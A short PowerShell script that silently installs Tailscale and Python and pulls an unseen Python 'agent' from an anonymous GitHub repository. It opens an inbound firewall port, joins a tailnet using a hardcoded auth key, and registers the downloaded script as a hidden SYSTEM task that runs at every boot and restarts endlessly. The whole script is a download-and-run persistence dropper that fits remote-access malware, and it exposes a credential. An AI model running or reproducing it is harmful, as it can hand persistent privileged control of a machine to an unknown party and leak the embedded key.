$AuthKey="tskey-auth-k8EqA58q7C11CNTRL-j3fTgf71Cx9HzX8x1w7Ex9sS54NGSJe9V"; $ScriptURL="https://raw.githubusercontent.com/0xLostByte/test2/refs/heads/main/wow.py"; $DeviceName="my-remote-pc"; $Dir="C:\RemoteAgent"; $Port=5555
Write-Host "[1/6] Tailscale..." -ForegroundColor Cyan
$ts="$env:TEMP\ts.exe"; Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile $ts; Start-Process $ts -ArgumentList "/quiet /norestart TS_UNATTENDEDMODE=always" -Wait
Write-Host "[2/6] Python..." -ForegroundColor Cyan
$py="$env:TEMP\py.exe"; Invoke-WebRequest "https://www.python.org/ftp/python/3.12.5/python-3.12.5-amd64.exe" -OutFile $py; Start-Process $py -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
Write-Host "[3/6] Agent..." -ForegroundColor Cyan
New-Item -ItemType Directory -Force -Path $Dir | Out-Null; $c=(Invoke-WebRequest $ScriptURL -UseBasicParsing).Content; Set-Content -Path "$Dir\agent.py" -Value $c -Encoding UTF8
Write-Host "[4/6] Firewall..." -ForegroundColor Cyan
Remove-NetFirewallRule -DisplayName "RemoteAgent-TS" -ErrorAction SilentlyContinue; New-NetFirewallRule -DisplayName "RemoteAgent-TS" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow -Profile Any | Out-Null
Write-Host "[5/6] Tailscale up..." -ForegroundColor Cyan
Start-Sleep 5; & "C:\Program Files\Tailscale\tailscale.exe" up --auth-key=$AuthKey --hostname=$DeviceName --unattended --accept-routes
Write-Host "[6/6] Auto-start task..." -ForegroundColor Cyan
$env:Path=[System.Environment]::GetEnvironmentVariable("Path","Machine")+";"+[System.Environment]::GetEnvironmentVariable("Path","User")
$pyw=(Get-Command pythonw.exe -ErrorAction SilentlyContinue).Source; if(-not $pyw){$pyw="C:\Program Files\Python312\pythonw.exe"}
$a=New-ScheduledTaskAction -Execute $pyw -Argument "$Dir\agent.py"
$t=New-ScheduledTaskTrigger -AtStartup
$p=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit (New-TimeSpan -Days 0)
Register-ScheduledTask -TaskName "RemoteAgent" -Action $a -Trigger $t -Principal $p -Settings $s -Force | Out-Null
Start-ScheduledTask -TaskName "RemoteAgent"
Write-Host "`nDONE! Device: $DeviceName" -ForegroundColor Green
